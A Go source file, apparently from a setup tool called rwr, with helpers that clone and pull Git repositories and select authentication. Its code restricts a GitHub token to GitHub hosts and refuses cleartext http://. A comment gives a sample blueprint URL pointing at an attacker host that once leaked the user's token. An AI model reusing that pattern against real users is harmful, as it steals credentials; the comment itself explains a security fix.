package helpers

import (
	"encoding/base64"
	"errors"
	"fmt"
	"io/fs"
	neturl "net/url"
	"os"
	"path/filepath"
	"strings"

	"charm.land/log/v2"
	"github.com/fynxlabs/rwr/internal/types"
	"github.com/go-git/go-git/v5"
	"github.com/go-git/go-git/v5/config"
	"github.com/go-git/go-git/v5/plumbing/transport"
	"github.com/go-git/go-git/v5/plumbing/transport/http"
	"github.com/go-git/go-git/v5/plumbing/transport/ssh"
)

// HandleGitClone clones a Git repository to the specified path with optional
// authentication via SSH key, GitHub API token, or OAuth.
func HandleGitClone(opts types.GitOptions, initConfig *types.InitConfig) error {
	var auth transport.AuthMethod

	log.Debugf("Cloning Git repository: %s", opts.URL)

	// Use authentication for private repos or SSH URLs
	if opts.Private || strings.HasPrefix(opts.URL, "git@") {
		var err error
		auth, err = getAuthMethod(opts.URL, initConfig)
		if err != nil {
			return fmt.Errorf("error authenticating Git clone: %w", err)
		}
		log.Debugf("Using authentication for Git clone: %s", opts.URL)
	} else {
		log.Debugf("No authentication needed for Git clone: %s", opts.URL)
	}

	targetDir := filepath.Dir(opts.Target)
	// 0755, not os.ModePerm: 0777 through a permissive umask is a directory
	// every local user can write, on a path about to hold a cloned repository.
	err := os.MkdirAll(targetDir, 0o755) // #nosec G301 -- parent of a blueprint-named clone target; 0755 so the checkout stays world-readable, never world-writable
	if err != nil {
		return fmt.Errorf("error creating target directory: %v", err)
	}

	_, err = git.PlainClone(opts.Target, false, &git.CloneOptions{
		URL:  opts.URL,
		Auth: auth,
	})
	if err != nil {
		return fmt.Errorf("error cloning Git repository: %v", err)
	}

	log.Infof("Git repository cloned to: %s", opts.Target)

	// Check and update remote URL if necessary
	err = CheckAndUpdateRemoteURL(opts.Target, opts.URL)
	if err != nil {
		return fmt.Errorf("error checking/updating remote URL: %v", err)
	}

	return nil
}

// CheckAndUpdateRemoteURL verifies and updates the origin remote URL of an
// existing Git repository if it differs from the desired URL.
func CheckAndUpdateRemoteURL(repoPath, desiredURL string) error {
	repo, err := git.PlainOpen(repoPath)
	if err != nil {
		return fmt.Errorf("error opening Git repository: %v", err)
	}

	remote, err := repo.Remote("origin")
	if err != nil {
		return fmt.Errorf("error getting remote 'origin': %v", err)
	}

	currentURL := remote.Config().URLs[0]
	if currentURL != desiredURL {
		log.Infof("Updating remote URL from %s to %s", currentURL, desiredURL)

		// Remove the existing remote
		err = repo.DeleteRemote("origin")
		if err != nil {
			return fmt.Errorf("error removing existing remote: %v", err)
		}

		// Create a new remote with the updated URL
		_, err = repo.CreateRemote(&config.RemoteConfig{
			Name: "origin",
			URLs: []string{desiredURL},
		})
		if err != nil {
			return fmt.Errorf("error creating new remote with updated URL: %v", err)
		}
		log.Infof("Remote URL updated successfully")
	}

	return nil
}

// githubHosts are the hosts the configured GitHub token may be sent to.
var githubHosts = map[string]bool{
	"github.com":     true,
	"www.github.com": true,
	// Cloning a file from a repository goes through the raw content host.
	"raw.githubusercontent.com": true,
}

// getAuthMethod picks the credential for a remote, and returns an error rather
// than a credential when honouring the request would leak one.
//
// The URL comes from a blueprint, so it is attacker-controlled input whenever a
// blueprint is: this used to attach the user's GitHub token to every non-SSH
// remote, which meant `{url: "http://attacker.tld/r.git", private: true}` mailed
// the PAT to the attacker in cleartext. The token now goes to GitHub's hosts and
// nowhere else, and http:// is refused for private repos outright - there is no
// safe way to send a credential over it.
func getAuthMethod(rawURL string, initConfig *types.InitConfig) (transport.AuthMethod, error) {
	if !strings.HasPrefix(rawURL, "git@") {
		return getHTTPAuthMethod(rawURL, initConfig)
	}
	return getSSHAuthMethod(initConfig)
}

// getHTTPAuthMethod returns the token for GitHub remotes and no credential for
// every other host, so a non-GitHub remote is cloned anonymously rather than
// handed a secret it has no claim to.
func getHTTPAuthMethod(rawURL string, initConfig *types.InitConfig) (transport.AuthMethod, error) {
	parsed, err := neturl.Parse(rawURL)
	if err != nil {
		return nil, fmt.Errorf("invalid repository URL %q: %w", rawURL, err)
	}

	if parsed.Scheme == "http" {
		return nil, fmt.Errorf("refusing to use %q: http:// sends the repository credential in cleartext, use https:// instead", rawURL)
	}
	if parsed.Scheme != "https" {
		return nil, fmt.Errorf("refusing to use %q: only https:// and git@ remotes support authentication", rawURL)
	}

	if !githubHosts[strings.ToLower(parsed.Hostname())] {
		log.Warnf("Not sending the GitHub token to %s: it is not a GitHub host; cloning without authentication", parsed.Hostname())
		return nil, nil
	}

	token := initConfig.Variables.Flags.GHAPIToken
	if token == "" {
		log.Debugf("No GitHub token configured; cloning %s without authentication", rawURL)
		return nil, nil
	}

	return &http.BasicAuth{
		Username: "git",
		Password: token,
	}, nil
}

// sshKeyMaterial decides whether a configured ssh key value is the key itself
// rather than a path to it, and returns the PEM bytes when it is.
//
// Two forms count as the key itself:
//
//   - the PEM as written, which contains newlines (an "ssh-" prefix is
//     accepted too, though that is a public key and go-git will reject it
//     later with a better message than a stat failure would).
//   - base64 of that PEM. This is the form set_as_rwr_ssh_key writes into
//     repository.ssh_private_key and the form --ssh-key documents, and
//     nothing decoded it: base64 has no newlines and no "ssh-" prefix, so it
//     fell through to the file-path branch and rwr tried to open the blob as
//     a filename. set_as_rwr_ssh_key produced a config value that could never
//     authenticate anything.
//
// The decode has to prove itself: a bare filename can be valid base64 by
// accident, so the decoded bytes must actually look like a key before they are
// treated as one, and anything else stays a path.
func sshKeyMaterial(value string) ([]byte, bool) {
	if strings.Contains(value, "\n") || strings.HasPrefix(value, "ssh-") {
		log.Debugf("Using the SSH key material as supplied")
		return []byte(value), true
	}

	decoded, err := base64.StdEncoding.DecodeString(strings.TrimSpace(value))
	if err != nil {
		return nil, false
	}
	if !looksLikeSSHKey(decoded) {
		return nil, false
	}
	log.Debugf("Using base64-encoded SSH key material")
	return decoded, true
}

// looksLikeSSHKey reports whether bytes are plausibly an SSH key, so a path
// that happens to decode as base64 is not mistaken for one.
func looksLikeSSHKey(data []byte) bool {
	text := string(data)
	return strings.Contains(text, "PRIVATE KEY") || strings.HasPrefix(text, "ssh-")
}

// truncateForError keeps a bad ssh key value out of the log at full length: it
// may be the key itself, and the point of the message is which value was
// rejected, not what it contained.
func truncateForError(value string) string {
	const max = 32
	if len(value) <= max {
		return value
	}
	return value[:max] + "..."
}

func getSSHAuthMethod(initConfig *types.InitConfig) (transport.AuthMethod, error) {
	// Use the specified SSH key or try to find a suitable key
	sshKeyValue := initConfig.Variables.Flags.SSHKey

	// The value is key material (raw or base64) or a path to a key file.
	if sshKeyValue != "" {
		if material, ok := sshKeyMaterial(sshKeyValue); ok {
			auth, err := ssh.NewPublicKeys("git", material, "")
			if err != nil {
				return nil, fmt.Errorf("error creating SSH authentication from the supplied key: %w", err)
			}
			return auth, nil
		}

		// Treat as a file path. Any stat failure disqualifies it, not just
		// ENOENT: a base64 blob that failed to decode stats as ENAMETOOLONG,
		// and reporting that as "error creating SSH authentication from file:
		// open LS0tLS1CRUdJTi...: file name too long" told the operator
		// nothing about what was actually wrong.
		//
		// The PathError's own Err is what gets wrapped, never the PathError
		// itself: its message repeats the whole path, and when this value is
		// key material rather than a path that is the private key going into
		// an error string.
		if _, err := os.Stat(sshKeyValue); err != nil {
			reason := err
			var pathErr *fs.PathError
			if errors.As(err, &pathErr) {
				reason = pathErr.Err
			}
			return nil, fmt.Errorf("ssh key %q is neither a readable file nor recognisable key material: %w", truncateForError(sshKeyValue), reason)
		}

		auth, err := ssh.NewPublicKeysFromFile("git", sshKeyValue, "")
		if err != nil {
			return nil, fmt.Errorf("error creating SSH authentication from file: %w", err)
		}
		return auth, nil
	}

	// No SSH key specified, try to find a suitable key file
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return nil, fmt.Errorf("error getting user home directory: %w", err)
	}

	// List of common SSH key locations to try
	possibleKeys := []string{
		filepath.Join(homeDir, ".ssh", "id_rsa"),
		filepath.Join(homeDir, ".ssh", "git"),
		filepath.Join(homeDir, ".ssh", "id_ed25519"),
		filepath.Join(homeDir, ".ssh", "github_rsa"),
		filepath.Join(homeDir, ".ssh", "id_ecdsa"),
	}

	// Try each possible key location
	sshKeyPath := ""
	for _, keyPath := range possibleKeys {
		if _, err := os.Stat(keyPath); err == nil {
			sshKeyPath = keyPath
			log.Debugf("Found SSH key at: %s", sshKeyPath)
			break
		}
	}

	if sshKeyPath == "" {
		return nil, fmt.Errorf("no SSH key found in common locations: specify an SSH key path or Base64-encoded key")
	}

	auth, err := ssh.NewPublicKeysFromFile("git", sshKeyPath, "")
	if err != nil {
		return nil, fmt.Errorf("error creating SSH authentication: %w", err)
	}
	return auth, nil
}

// HandleGitPull pulls the latest changes from a remote Git repository,
// using the configured authentication method if available.
func HandleGitPull(opts types.GitOptions, initConfig *types.InitConfig) error {
	log.Debugf("Pulling changes from Git repository: %s", opts.Target)
	repo, err := git.PlainOpen(opts.Target)
	if err != nil {
		log.Errorf("Error opening Git repository: %v", err)
		return fmt.Errorf("error opening Git repository: %v", err)
	}

	worktree, err := repo.Worktree()
	if err != nil {
		log.Errorf("Error getting worktree: %v", err)
		return fmt.Errorf("error getting worktree: %v", err)
	}

	// Get the remote URL to determine if we need authentication
	remote, err := repo.Remote("origin")
	if err != nil {
		log.Errorf("Error getting remote 'origin': %v", err)
		return fmt.Errorf("error getting remote 'origin': %v", err)
	}

	var auth transport.AuthMethod
	if len(remote.Config().URLs) > 0 {
		remoteURL := remote.Config().URLs[0]
		// For SSH URLs (git@...) or if the repo is marked as private, use authentication
		if strings.HasPrefix(remoteURL, "git@") || opts.Private {
			auth, err = getAuthMethod(remoteURL, initConfig)
			if err != nil {
				return fmt.Errorf("error authenticating Git pull: %w", err)
			}
			log.Debugf("Using authentication for Git pull: %s", opts.Target)
		} else {
			log.Debugf("No authentication needed for Git pull: %s", opts.Target)
		}
	}

	err = worktree.Pull(&git.PullOptions{
		Auth: auth,
	})
	if err != nil && !errors.Is(err, git.NoErrAlreadyUpToDate) {
		log.Errorf("Error pulling changes from Git repository: %v", err)
		return fmt.Errorf("error pulling changes from Git repository: %v", err)
	}

	log.Infof("Git repository updated: %s", opts.Target)
	return nil
}
